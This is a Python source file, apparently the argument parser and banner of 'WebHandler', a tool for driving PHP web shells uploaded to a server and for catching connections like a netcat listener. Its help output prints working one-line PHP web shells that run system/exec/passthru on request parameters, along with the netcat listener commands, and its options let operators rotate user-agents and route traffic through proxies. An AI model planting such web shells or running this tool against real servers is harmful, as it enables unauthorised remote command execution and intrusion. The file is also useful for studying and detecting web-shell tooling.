from os import path, getcwd
from subprocess import Popen, PIPE
from sys import argv

try:
    import argparse
except ImportError:
    errmsg = '\n[!] The "argparse" module is required'
    errmsg += '\n[i] Run: \'sudo (apt-get|yum) install python-setuptools '
    errmsg += '&& sudo easy_install argparse\' OR \'sudo pip --install argparse\''
    exit(errmsg)
else:
    pass

from core.libs.termcolor import colored, cprint


class Banner(object):
    banner = colored("""
\t\t__          __  _     _    _                 _ _
\t\t\ \        / / | |   | |  | |               | | |
\t\t \ \  /\  / /__| |__ | |__| | __ _ _ __   __| | | ___ _ __
\t\t  \ \/  \/ / _ \ '_ \|  __  |/ _` | '_ \ / _` | |/ _ \ '__|
\t\t   \  /\  /  __/ |_) | |  | | (_| | | | | (_| | |  __/ |
\t\t    \/  \/ \___|_.__/|_|  |_|\__,_|_| |_|\__,_|_|\___|_|
\t\t-----------------------------------------------------------""", 'yellow')

    if not path.exists(path.join(getcwd(), ".git")):
        banner += colored('\n\t\t  [!] "non-git". Keep up-to-date by running \'--update\'', 'red')
    else:
        f = Popen('git rev-parse --short HEAD', shell=True, stdout=PIPE, stderr=PIPE)
        current_commit = f.communicate()[0]
        banner += colored('\n{0}Version: {1}'.format('\t' * 7, current_commit), 'green')


class GetArgs(object):
    if len(argv) <= 1:
        cprint("-- Hanlder for PHP system functions & alternative 'netcat listener' --\n", 'blue')
        cprint("--   Which works for POST and GET requests:    --", 'blue')
        cprint("1-   <?php system($_GET['parameter']); ?>", 'yellow')
        cprint("2-   <?php exec($_POST['parameter']); ?>", 'yellow')
        cprint("3-   <?php passthru($_REQUEST['parameter']); ?>\n", 'yellow')
        cprint("--   Alternative 'netcat listener'    --", 'blue')
        cprint("1-   netcat -l -p 1234", 'yellow')
        cprint("2-   nc -lvvp 4321\n", 'yellow')
        print "Run: " + colored("{0} -h".format(argv[0]), 'red') + " for help"
        exit(1)
    else:
        parser = argparse.ArgumentParser(
                add_help=False,
                usage='%(prog)s -h',
                formatter_class=argparse.RawTextHelpFormatter,
                epilog='''
Examples:
    python %(prog)s --url http://www.mywebsite.com/shell.php?cmd=
    python %(prog)s --url http://www.mywebsite.com/shell.php --method POST --parameter cmd
    python %(prog)s -u http://www.mywebsite.com/shell.php?cmd= --random-agent --turbo
    python %(prog)s -u http://www.mywebsite.com/shell.php?cmd= --proxy http://127.0.0.1:8080

    python %(prog)s --listen 1234
    python %(prog)s -l 4444''')

        # shell controller group
        shell_handler = parser.add_argument_group('Shell Handler')
        shell_handler.add_argument('-u', '--url', dest='url', help='\t\tFull URL for the uploaded PHP code', metavar='')
        shell_handler.add_argument('-t', '--turbo', dest='turbo', help='\t\tIncrease the execution speed if the out-put doesn\'t contain garbage', action='store_true')
        shell_handler.add_argument('-m', '--method', dest='method', help='\t\tThe method used in the uploaded PHP code (e.g. post)', metavar='')
        shell_handler.add_argument('-p', '--parameter', dest='parameter', help='\t\tParameter that used in the shell (e.g. cmd)', metavar='')
        shell_handler.add_argument('-x', '--proxy', dest='proxy', help='\t\tProxy (e.g. \'http://127.0.0.1:8080\')', metavar='')
        shell_handler.add_argument('-g', '--user-agent', dest='agent', help='\t\tuser-agent (e.g. \'Mozilla/5.0\')', metavar='')
        shell_handler.add_argument('-rg', '--random-agent', dest='random_agent', help='\t\tWebHandler will use some random user-agent', action='store_true')

        # nc alternative group
        nc_alternative = parser.add_argument_group('NetCat Alternative')
        nc_alternative.add_argument('-l', '--listen', dest='listen', type=int, help='\t\tListen for a connection', metavar='')

        # general group
        general = parser.add_argument_group('General')
        general.add_argument('-h', '--help', action='help', help='\t\tPrint this help message then exit')
        general.add_argument('-up', '--update', dest='update', help='\t\tUpdate webhandler from git cli "GitHub repo"', action='store_true')

        options = parser.parse_args()
        url = options.url
        if url:
            url = url if url.startswith('http') else 'http://' + url
        listen = options.listen
        method = options.method.lower() if options.method else None
        parameter = options.parameter
        proxy = options.proxy
        agent = options.agent
        random_agent = options.random_agent
        turbo = options.turbo
        update = options.update

getargs = GetArgs()
banner = Banner().banner
